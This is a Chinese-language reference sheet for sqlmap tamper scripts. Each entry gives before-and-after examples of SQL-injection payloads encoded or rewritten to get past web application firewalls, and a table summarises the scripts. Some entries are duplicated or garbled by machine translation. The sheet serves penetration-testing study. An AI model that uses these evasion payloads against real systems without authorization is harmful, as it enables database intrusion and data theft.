# SQLMAP--Tamper

`--identify-waf`

### 0x02 常用tamper脚本

#### **apostrophemask.py**

适用数据库：ALL 
作用：将引号替换为utf-8，用于过滤单引号 
使用脚本前：`tamper("1 AND '1'='1")` 
使用脚本后：`1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`

#### **base64encode.py**

适用数据库：ALL 
作用：替换为base64编码 
使用脚本前：`tamper("1' AND SLEEP(5)#")` 
使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==`

#### **multiplespaces.py**

适用数据库：ALL 
作用：围绕sql关键字添加多个空格 
使用脚本前：`tamper('1 UNION SELECT foobar')` 
使用脚本后：`1 UNION SELECT foobar`

#### **space2plus.py**

适用数据库：ALL 
作用：用加号替换空格 
使用脚本前：`tamper('SELECT id FROM users')` 
使用脚本后：`SELECT+id+FROM+users`

#### **nonrecursivereplacement.py**

适用数据库：ALL 
作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空） 
使用脚本前：`tamper('1 UNION SELECT 2--')` 
使用脚本后：`1 UNIOUNIONN SELESELECTCT 2--`

#### **space2randomblank.py**

适用数据库：ALL 
作用：将空格替换为其他有效字符 
使用脚本前：`tamper('SELECT id FROM users')` 
使用脚本后：`SELECT%0Did%0DFROM%0Ausers`

#### **unionalltounion.py**

适用数据库：ALL 
作用：将`union allselect` 替换为`unionselect` 
使用脚本前：`tamper('-1 UNION ALL SELECT')` 
使用脚本后：`-1 UNION SELECT`

#### **securesphere.py**

适用数据库：ALL 
作用：追加特定的字符串 
使用脚本前：`tamper('1 AND 1=1')` 
使用脚本后：`1 AND 1=1 and '0having'='0having'`

#### **space2dash.py**

适用数据库：ALL 
作用：将空格替换为`--`，并添加一个随机字符串和换行符 
使用脚本前：`tamper('1 AND 9227=9227')` 
使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`

#### **space2mssqlblank.py**

适用数据库：Microsoft SQL Server 
测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005 
作用：将空格随机替换为其他空格符号`('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')` 
使用脚本前：`tamper('SELECT id FROM users')` 
使用脚本后：`SELECT%0Eid%0DFROM%07users`

#### **between.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 
作用：用`NOT BETWEEN 0 AND #`替换`>` 
使用脚本前：`tamper('1 AND A > B--')` 
使用脚本后：`1 AND A NOT BETWEEN 0 AND B--`

#### **percentage.py**

适用数据库：ASP 
测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0 
作用：在每个字符前添加一个`%` 
使用脚本前：`tamper('SELECT FIELD FROM TABLE')` 
使用脚本后：`%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`

#### **sp_password.py**

适用数据库：MSSQL 
作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password 
使用脚本前：`tamper('1 AND 9227=9227-- ')` 
使用脚本后：`1 AND 9227=9227-- sp_password`

#### **charencode.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 
作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） 
使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')` 
使用脚本后：`%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45`

#### **randomcase.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 
作用：随机大小写 
使用脚本前：`tamper('INSERT')` 
使用脚本后：`INseRt`

#### **charunicodeencode.py**

适用数据库：ASP、ASP.NET 
测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3 
作用：适用字符串的unicode编码 
使用脚本前：`tamper('SELECT FIELD%20FROM TABLE')` 
使用脚本后：`%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045`

#### **space2comment.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 
作用：将空格替换为`/**/` 
使用脚本前：`tamper('SELECT id FROM users')` 
使用脚本后：`SELECT/**/id/**/FROM/**/users`

#### **equaltolike.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5 
作用：将`=`替换为`LIKE` 
使用脚本前：`tamper('SELECT * FROM users WHERE id=1')` 
使用脚本后：`SELECT * FROM users WHERE id LIKE 1`

#### **equaltolike.py**

测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 
作用：将`>`替换为GREATEST，绕过对`>`的过滤 
使用脚本前：`tamper('1 AND A > B')` 
使用脚本后：`1 AND GREATEST(A,B+1)=A`

#### **ifnull2ifisnull.py**

适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) 
测试通过数据库：MySQL 5.0 and 5.5 
作用：将类似于`IFNULL(A, B)`替换为`IF(ISNULL(A), B, A)`，绕过对`IFNULL`的过滤 
使用脚本前：`tamper('IFNULL(1, 2)')` 
使用脚本后：`IF(ISNULL(1),2,1)`

#### **modsecurityversioned.py**

适用数据库：MySQL 
测试通过数据库：MySQL 5.0 
作用：过滤空格，使用mysql内联注释的方式进行注入 
使用脚本前：`tamper('1 AND 2>1--')` 
使用脚本后：`1 /*!30874AND 2>1*/--`

#### **space2mysqlblank.py**

适用数据库：MySQL 
测试通过数据库：MySQL 5.1 
作用：将空格替换为其他空格符号`('%09', '%0A', '%0C', '%0D', '%0B')` 
使用脚本前：`tamper('SELECT id FROM users')` 
使用脚本后：`SELECT%0Bid%0DFROM%0Cusers`

#### **modsecurityzeroversioned.py**

适用数据库：MySQL 
测试通过数据库：MySQL 5.0 
作用：使用内联注释方式`（/*!00000*/）`进行注入 
使用脚本前：`tamper('1 AND 2>1--')` 
使用脚本后：`1 /*!00000AND 2>1*/--`

#### **space2mysqldash.py**

适用数据库：MySQL、MSSQL 
作用：将空格替换为 `--` ，并追随一个换行符 
使用脚本前：`tamper('1 AND 9227=9227')` 
使用脚本后：`1--%0AAND--%0A9227=9227`

#### **bluecoat.py**

适用数据库：Blue Coat SGOS 
测试通过数据库：MySQL 5.1,、SGOS 
作用：在sql语句之后用有效的随机空白字符替换空格符，随后用`LIKE`替换`=` 
使用脚本前：`tamper('SELECT id FROM users where id = 1')` 
使用脚本后：`SELECT%09id FROM users where id LIKE 1`

#### **versionedkeywords.py**

适用数据库：MySQL 
测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11 
作用：注释绕过 
使用脚本前：`tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')` 
使用脚本后：`1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#`

#### **halfversionedmorekeywords.py**

适用数据库：MySQL < 5.1 
测试通过数据库：MySQL 4.0.18/5.0.22 
作用：在每个关键字前添加mysql版本注释 
使用脚本前：`tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")` 
使用脚本后：`value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa`

#### **space2morehash.py**

适用数据库：MySQL >= 5.1.13 
测试通过数据库：MySQL 5.1.41 
作用：将空格替换为`#`，并添加一个随机字符串和换行符 
使用脚本前：`tamper('1 AND 9227=9227')` 
使用脚本后：`1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227`

#### **apostrophenullencode.py**

适用数据库：ALL 
作用：用非法双字节Unicode字符替换单引号 
使用脚本前：`tamper("1 AND '1'='1")` 
使用脚本后：`1 AND %00%271%00%27=%00%271`

#### **appendnullbyte.py**

适用数据库：ALL 
作用：在有效载荷的结束位置加载null字节字符编码 
使用脚本前：`tamper('1 AND 1=1')` 
使用脚本后：`1 AND 1=1%00`

#### **chardoubleencode.py**

适用数据库：ALL 
作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） 
使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')` 
使用脚本后：`%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545`

#### **unmagicquotes.py**

适用数据库：ALL 
作用：用一个多字节组合`%bf%27`和末尾通用注释一起替换空格 
使用脚本前：`tamper("1' AND 1=1")` 
使用脚本后：`1%bf%27 AND 1=1--`

#### **randomcomments.py**

适用数据库：ALL 
作用：用注释符分割sql关键字 
使用脚本前：`tamper('INSERT')` 
使用脚本后：`I/**/N/**/SERT`



### 0x03 更全面的翻译
|  脚本名称    |   作用   |
| ---- | ---- |
|apostrophemask.py|用其UTF-8全角字符替换撇号（'）（例如'->％EF％BC％87）|
|apostrophenullencode.py|用非法的双unicode替换撇号（'）（例如'->％00％27）|
|appendnullbyte.py|在有效载荷的末尾附加（访问）NULL字节字符（％00）|
| base64encode.py|Base64对给定有效载荷中的所有字符进行编码|
|between.py| 替换较大比运算符（'>'）带有'NOT BETWEEN 0 AND＃'，等于运算符（'='）与'BETWEEN＃AND＃'|
|bluecoat.py|用有效的随机空白字符替换SQL语句后的空格字符。然后用运算符LIKE替换字符'='|
|chardoubleencode.py|双重URL编码给定有效负载中的所有字符（未处理已编码)(SELECT->％2553％2545％254C％2545％2543％2554）|
|charencode.py|URL编码中的所有字符给定的有效载荷（不处理已经编码的）（例如SELECT->％53％45％4C％45％43％54）|
|charunicodeencode.py|Unicode-URL编码给定的有效载荷中的所有字符（不处理已经编码的）（例如SELECT->％u0053％u0045％u004C％u0045％u0043％u0054）|
|charunicodeescape.py|Unicode转义给定有效负载中的未编码字符（未处理已编码的字符）（例如SELECT-> \ u0053 \ u0045 \ u004C \ u0045 \ u0043 \ u0054）|
|commalesslimit.py|用'LIMIT N OFFSET M'替换（MySQL）实例，例如'LIMIT M，N'|
|commalessmid.py|用'MID（A FROM B FOR C）'替换（MySQL）实例，例如'MID（A，B，C）'|
|commentbeforeparentheses.py|在括号前加（内联）注释（例如（（-> / ** /（）|
|concat2concatws.py|用'CONCAT_WS（MID（CHAR（0），0，0），A，B）' 等价物（相当于）替换（MySQL）实例，例如'CONCAT（A，B）' 。|
|equaltolike.py|将所有出现的等于（'='）运算符替换为'LIKE'|
|escapequotes.py|斜杠转义单引号和双引号（例如'-> \'）|
|great.py| 替换大于运算符（'>' ）和'GREATEST'对应|
|Halfversionedmorekeywords.py|在每个关键字|
|hex2char.py|替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串|
|htmlencode.py|HTML编码（使用代码点）所有非字母数字字符（例如'->'）|
|ifnull2casewhenisnull.py|替换'IFNULL（ A，B）'与'CASE WHEN ISNULL（A）THEN（B）ELSE（A）END'对应|
|ifnull2ifisnull.py|用'IF（ISNULL（A），B）替换'IFNULL（A，B）'之类的实例，A）'对应|
|informationschemacomment.py|在所有出现的（MySQL）“ information_schema”标识符的末尾添加一个内联注释（/ ** /）|
|least.py|用'LEAST'对应替换大于运算符（'>'）|
|lowercase.py|用小写值替换每个关键字字符（例如SELECT->选择）|
|luanginx.py|LUA-Nginx WAF绕过（例如Cloudflare）|
|modsecurityversioned.py|包含带有（MySQL）版本注释的完整查询|
|modsecurityzeroversioned.py|包含带有（MySQL）零版本注释的完整查询|
|multiplespaces.py|在SQL关键字周围添加多个空格（''）|
|overlongutf8.py|将给定有效载荷中的所有（非字母数字）字符转换为超长UTF8（未处理已编码）（例如'->％C0％A7）|
|overlongutf8more.py|将给定有效载荷中的所有字符转换为超长UTF8（尚未处理编码）（例如SELECT->％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94）|
|percent.py|在每个字符前面添加一个百分号（'％'） （例如SELECT->％S％E％L％E％C％T）|
|plus2concat.py|替换加号运算符（'+'）与（MsSQL）函数CONCAT（）对应|
|plus2fnconcat.py|用（MsSQL）ODBC函数{fn CONCAT（）}替换加号（'+'）对应项|
|randomcase.py|用随机大小写值替换每个关键字字符（例如SELECT-> SEleCt）|
|randomcomments.py|在SQL关键字内添加随机内联注释（例如SELECT-> S / ** / E / ** / LECT）|
|sp_password.py|将（MsSQL）函数'sp_password'附加到有效负载的末尾，以便从DBMS日志中自动进行混淆|
|space2comment.py|用注释'/ ** /' 替换空格字符（''）|
|space2dash.py|用短划线注释（'-'）替换空格字符（''），后跟一个随机字符串和一个新的行（'\ n'）|
|space2hash.py|用井字符（'＃'）替换（MySQL）空格字符（''）实例，后跟随机字符串和换行（'\ n'）|
|space2morecomment.py|替换（MySQL）带注释'/ ** _ ** /' 的空格字符（''）实例|
|space2morehash.py|用井号（'＃'）后面跟一个随机字符串替换（MySQL）空格字符（''）实例和新行（'\ n'）|
|space2mssqlblank.py|用有效的替代字符集中的随机空白字符替换空间字符（''）的（MsSQL）实例|
|space2mssqlhash.py|替换空间字符（'' ）和井号（'＃'），后接换行（'\ n'）|
|space2mysqlblank.py|用有效替代字符集中的随机空白字符替换（MySQL）空格字符（''）实例|
|space2mysqldash.py|用破折号（'-'）替换空格字符（''） ）后跟换行（'\ n'）|
|space2plus.py|用加号（'+'）替换空格字符（''）|
|space2randomblank.py|用空格中的随机空白字符替换空格字符（''）有效的替代字符集|
|substring2leftright.py|用LEFT和RIGHT替换PostgreSQL SUBSTRING|
|symbolicologic.py|用其符号对应物（&&和||）替换AND和OR逻辑运算符|
|unionalltounion.py|用UNION SELECT对应项替换UNION ALL SELECT的实例|
|unmagicquotes.py|用多字节组合％BF％27替换引号字符（'），并在末尾添加通用注释（以使其起作用）|
|uppercase.py|用大写值替换每个关键字字符（例如select -> SELECT）|
|varnish.py|附加HTTP标头'X-originating-IP'以绕过Varnish防火墙|
|versionedkeywords.py|用（MySQL）版本注释将每个非功能性关键字括起来|
|versionedmorekeywords.py|将每个关键字包含（MySQL）版本注释|
|xforwardedfor.py|附加伪造的HTTP标头'X-Forwarded-For'|

